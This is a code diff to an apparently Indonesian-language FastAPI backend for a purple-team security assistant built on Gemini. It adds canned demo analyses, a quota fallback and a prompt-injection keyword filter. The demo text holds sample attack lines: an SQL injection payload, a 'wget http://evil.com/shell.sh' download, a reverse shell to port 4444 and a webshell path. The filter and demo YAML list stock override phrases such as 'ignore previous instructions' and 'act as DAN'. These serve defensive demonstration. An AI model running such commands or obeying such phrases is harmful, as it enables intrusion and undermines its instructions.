@@ -158,6 +158,177 @@ def _require_api_key():
             ),
         )
 
+# ─── Demo Responses (digunakan saat DEMO_MODE=true atau quota habis) ─────────
+DEMO_RESPONSES = {
+    "red_team": """## 🔴 ANOA Red Team Analysis [DEMO MODE]
+
+### Attack Vectors Identified
+- **CVE-2024-1234** – SQL Injection via unsanitized user input pada endpoint `/api/login`
+- **CVE-2024-5678** – Reflected XSS pada parameter `redirect_url`
+- **Broken Access Control** – Admin endpoint `/api/admin/users` dapat diakses tanpa autentikasi
+
+### Exploitation Scenario
+1. Attacker menyuntikkan payload `' OR 1=1--` ke field username
+2. Database mengembalikan semua record pengguna
+3. Attacker mengekstrak password hash dan melakukan offline cracking
+
+### Risk Severity
+🔴 **CRITICAL** – Data seluruh pengguna dapat dikompromikan dalam <5 menit
+
+> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
+
+    "blue_team": """## 🔵 ANOA Blue Team Analysis [DEMO MODE]
+
+### Threat Assessment
+Terdeteksi pola **Lateral Movement** dan **Privilege Escalation** pada log jaringan.
+
+### Detection Rules (Sigma)
+```yaml
+title: ANOA - Suspicious Privilege Escalation
+status: experimental
+detection:
+  selection:
+    EventID: 4672
+    SubjectUserName|endswith: '$'
+  condition: selection
+level: high
+```
+
+### Mitigation Strategies
+1. ✅ Terapkan prinsip **Least Privilege** pada semua service account
+2. ✅ Aktifkan **MFA** untuk semua akun administrator
+3. ✅ Pasang **EDR** untuk deteksi real-time
+4. ✅ Audit log setiap 6 jam menggunakan SIEM
+
+### Severity Rating: 🟠 HIGH
+
+> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
+
+    "phishing": """## 🎣 ANOA Phishing Detection [DEMO MODE]
+
+## RISK LEVEL
+🔴 **CRITICAL**
+
+## PHISHING INDICATORS
+- 🚨 Domain spoofing: `paypa1.com` menyerupai `paypal.com` (karakter '1' mengganti 'l')
+- 🚨 Urgency language: "Your account will be suspended in 24 hours!"
+- 🚨 Suspicious link: `http://bit.ly/3xYZ` mengarah ke IP `185.220.101.x` (diketahui sebagai phishing host)
+- 🚨 Sender tidak cocok: `From: support@paypal.com` tapi header menunjukkan `smtp.evil-server.ru`
+
+## TECHNICAL ANALYSIS
+Teknik: **Homograph Attack** + **Email Spoofing**. Attacker menggunakan domain yang mirip secara visual untuk menipu korban.
+
+## VERDICT & RECOMMENDED ACTION
+❌ **PHISHING CONFIRMED** – Jangan klik link apapun. Laporkan ke tim IT Security dan hapus email ini.
+
+> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
+
+    "log_audit": """## 📋 ANOA Log Audit [DEMO MODE]
+
+### Anomalies Detected
+| Time | Event | Severity |
+|------|-------|----------|
+| 03:14:22 | 847 failed login attempts dari IP `192.168.1.105` | 🔴 CRITICAL |
+| 03:15:01 | Successful login setelah brute force | 🔴 CRITICAL |
+| 03:17:44 | `wget http://evil.com/shell.sh` dieksekusi | 🔴 CRITICAL |
+| 03:18:00 | Reverse shell terbuka ke `10.0.0.99:4444` | 🔴 CRITICAL |
+
+### Indicators of Compromise (IOC)
+- **IP**: `192.168.1.105`, `10.0.0.99`
+- **File**: `/tmp/shell.sh`, `/var/www/html/c99.php`
+- **Taktik MITRE**: T1110 (Brute Force) → T1059 (Command Execution) → T1071 (C2)
+
+### Containment Recommendations
+1. 🔒 Isolasi host `192.168.1.105` dari jaringan segera
+2. 🔒 Reset semua credential yang terekspos
+3. 🔒 Analisis forensik pada `/tmp` dan `/var/www/html`
+
+> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
+
+    "credential_detector": """## 🔐 ANOA Credential Detector [DEMO MODE]
+
+### Findings Summary
+**3 credential leaks detected** dengan severity CRITICAL
+
+### Detailed Findings
+
+**[1] Google API Key**
+- Tipe: Google Cloud API Key
+- Preview: `AIza****...****uVaTE`
+- Risk: 🔴 CRITICAL
+- Remediasi: Revoke segera di Google Cloud Console → IAM & Admin → API Keys
+
+**[2] Database Connection String**
+- Tipe: PostgreSQL credentials
+- Preview: `postgresql://admin:p4ss****@db.prod.example.com:5432/users`
+- Risk: 🔴 CRITICAL
+- Remediasi: Rotate password database, gunakan secret manager
+
+**[3] Private SSH Key Fragment**
+- Tipe: RSA Private Key
+- Preview: `-----BEGIN RSA PRIVATE KEY----- MIIEo****`
+- Risk: 🔴 CRITICAL
+- Remediasi: Generate keypair baru, invalidate key lama
+
+> ⚡ *Demo Mode aktif. Hubungkan ke Gemini API untuk analisis nyata.*""",
+}
+
+DEMO_YAML = """# ANOA System – Demo YAML Rule [DEMO MODE]
+# Untuk rule yang di-generate Gemini AI, aktifkan API Key
+
+rules:
+  - name: anoa_demo_prompt_injection_block
+    description: "Blokir semua pola prompt injection yang umum digunakan"
+    severity: HIGH
+    action: BLOCK
+    conditions:
+      - type: content_pattern
+        match_mode: regex
+        check: outbound
+        patterns:
+          - "(?i)(ignore|forget|disregard).{0,20}(previous|above|system).{0,20}(prompt|instruction)"
+          - "(?i)(jailbreak|bypass|override).{0,20}(safety|filter|policy|restriction)"
+          - "(?i)(act as|pretend to be|roleplay as).{0,30}(hacker|attacker|evil|malicious)"
+          - "(?i)(reveal|show|print|expose).{0,20}(system prompt|instructions|api.?key)"
+    response:
+      status_code: 403
+      message: "Request blocked by ANOA Security Policy – Prompt Injection Detected"
+      log: true
+      alert_level: HIGH
+    metadata:
+      created_by: ANOA_AI
+      version: "1.0"
+      tags:
+        - prompt-injection
+        - purple-team
+        - demo
+"""
+
+# ─── Helper: Panggil Gemini dengan fallback model ─────────────────────────────
+def _call_gemini(system_prompt: str, user_content: str) -> tuple[str, str]:
+    """
+    Mencoba GEMINI_PRIMARY dulu, fallback ke GEMINI_FALLBACK jika quota habis.
+    Returns (response_text, model_used)
+    """
+    for model_name in [GEMINI_PRIMARY, GEMINI_FALLBACK]:
+        try:
+            model = genai.GenerativeModel(
+                model_name=model_name,
+                system_instruction=system_prompt,
+            )
+            response = model.generate_content(user_content)
+            return response.text, model_name
+        except Exception as e:
+            err_str = str(e)
+            # Jika quota habis (429), coba model berikutnya
+            if "429" in err_str or "quota" in err_str.lower():
+                if model_name == GEMINI_FALLBACK:
+                    raise  # Kedua model quota habis
+                continue
+            raise  # Error lain, langsung raise
+    raise RuntimeError("Semua model Gemini tidak tersedia")
+
+
 # ─── Endpoints ────────────────────────────────────────────────────────────────
 @app.get("/")
 def health_check():
@@ -165,7 +336,9 @@ def health_check():
         "status": "ANOA System Backend is running!",
         "version": "2.0.0",
         "gemini_configured": bool(GEMINI_API_KEY),
-        "model": GEMINI_MODEL,
+        "demo_mode": DEMO_MODE,
+        "primary_model": GEMINI_PRIMARY,
+        "fallback_model": GEMINI_FALLBACK,
         "available_modes": list(SYSTEM_PROMPTS.keys()),
     }
 
@@ -174,13 +347,40 @@ def health_check():
 async def analyze(request: AnalyzeRequest):
     """
     Endpoint utama untuk analisis Purple Team AI.
-    Mode yang tersedia: red_team, blue_team, phishing, log_audit, credential_detector
+    Mode: red_team, blue_team, phishing, log_audit, credential_detector
+    Jika DEMO_MODE=true atau quota habis, mengembalikan demo response.
     """
-    _require_api_key()
+    # ── Demo Mode: kembalikan respons contoh tanpa memanggil Gemini ──────────
+    if DEMO_MODE or not GEMINI_API_KEY:
+        demo_text = DEMO_RESPONSES.get(request.mode, DEMO_RESPONSES["blue_team"])
+        return AnalyzeResponse(
+            result=demo_text,
+            mode=request.mode,
+            model_used="DEMO_MODE",
+        )
 
     system_prompt = SYSTEM_PROMPTS.get(request.mode, SYSTEM_PROMPTS["blue_team"])
 
-    # Inject RAG context jika ada
+    # ── Simulasi Lobster Trap DPI (Outbound Check) ───────────────────────────
+    injection_patterns = [
+        "ignore previous", "forget instructions", "jailbreak",
+        "bypass safety", "act as dan", "pretend you are",
+    ]
+    data_lower = request.data.lower()
+    for pattern in injection_patterns:
+        if pattern in data_lower:
+            return AnalyzeResponse(
+                result=(
+                    "🛡️ **[ANOA LOBSTER TRAP – DPI BLOCKED]**\n\n"
+                    f"Request diblokir: terdeteksi pola **Prompt Injection** (`{pattern}`).\n"
+                    "HTTP 403 Forbidden – Request tidak diteruskan ke Gemini API.\n\n"
+                    "*Log insiden telah dicatat.*"
+                ),
+                mode=request.mode,
+                model_used="LOBSTER_TRAP_DPI",
+            )
+
+    # ── Inject RAG context jika ada ──────────────────────────────────────────
     user_content = request.data
     if request.context:
         user_content = (
@@ -188,44 +388,60 @@ async def analyze(request: AnalyzeRequest):
             f"[USER QUERY]\n{request.data}"
         )
 
+    # ── Panggil Gemini dengan fallback otomatis ───────────────────────────────
     try:
-        model = genai.GenerativeModel(
-            model_name=GEMINI_MODEL,
-            system_instruction=system_prompt,
-        )
-        response = model.generate_content(user_content)
-
+        result_text, model_used = _call_gemini(system_prompt, user_content)
         return AnalyzeResponse(
-            result=response.text,
+            result=result_text,
             mode=request.mode,
-            model_used=GEMINI_MODEL,
+            model_used=model_used,
         )
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Gemini API error: {str(e)}")
+        err_str = str(e)
+        # Quota habis: kembalikan demo response + pesan informatif
+        if "429" in err_str or "quota" in err_str.lower():
+            demo_text = DEMO_RESPONSES.get(request.mode, DEMO_RESPONSES["blue_team"])
+            return AnalyzeResponse(
+                result=(
+                    "⚠️ **Quota Gemini API habis** (Free Tier limit tercapai).\n"
+                    "Menampilkan Demo Response untuk keperluan presentasi:\n\n---\n\n"
+                    + demo_text
+                ),
+                mode=request.mode,
+                model_used="DEMO_FALLBACK",
+            )
+        raise HTTPException(status_code=500, detail=f"Gemini API error: {err_str}")
 
 
 @app.post("/generate-yaml", response_model=YamlResponse)
 async def generate_yaml(request: YamlRequest):
     """
-    Endpoint untuk generate YAML Lobster Trap rules dari deskripsi natural language.
+    Generate YAML Lobster Trap rules dari deskripsi natural language via Gemini.
+    Jika DEMO_MODE=true atau quota habis, kembalikan demo YAML.
     """
-    _require_api_key()
+    # ── Demo Mode ────────────────────────────────────────────────────────────
+    if DEMO_MODE or not GEMINI_API_KEY:
+        return YamlResponse(yaml_content=DEMO_YAML)
 
     try:
-        model = genai.GenerativeModel(
-            model_name=GEMINI_MODEL,
-            system_instruction=YAML_SYSTEM_PROMPT,
-        )
-        response = model.generate_content(request.prompt)
+        result_text, _ = _call_gemini(YAML_SYSTEM_PROMPT, request.prompt)
 
         # Bersihkan markdown fences jika model tetap menambahkannya
-        yaml_text = response.text
-        if yaml_text.startswith("```"):
-            lines = yaml_text.split("\n")
-            yaml_text = "\n".join(
+        if result_text.startswith("```"):
+            lines = result_text.split("\n")
+            result_text = "\n".join(
                 line for line in lines if not line.startswith("```")
             )
 
-        return YamlResponse(yaml_content=yaml_text.strip())
+        return YamlResponse(yaml_content=result_text.strip())
+
     except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Gemini API error: {str(e)}")
+        err_str = str(e)
+        # Quota habis: kembalikan demo YAML
+        if "429" in err_str or "quota" in err_str.lower():
+            demo_yaml_with_note = (
+                "# ⚠️ Quota Gemini API habis – Menampilkan Demo YAML\n\n"
+                + DEMO_YAML
+            )
+            return YamlResponse(yaml_content=demo_yaml_with_note)
+        raise HTTPException(status_code=500, detail=f"Gemini API error: {err_str}")
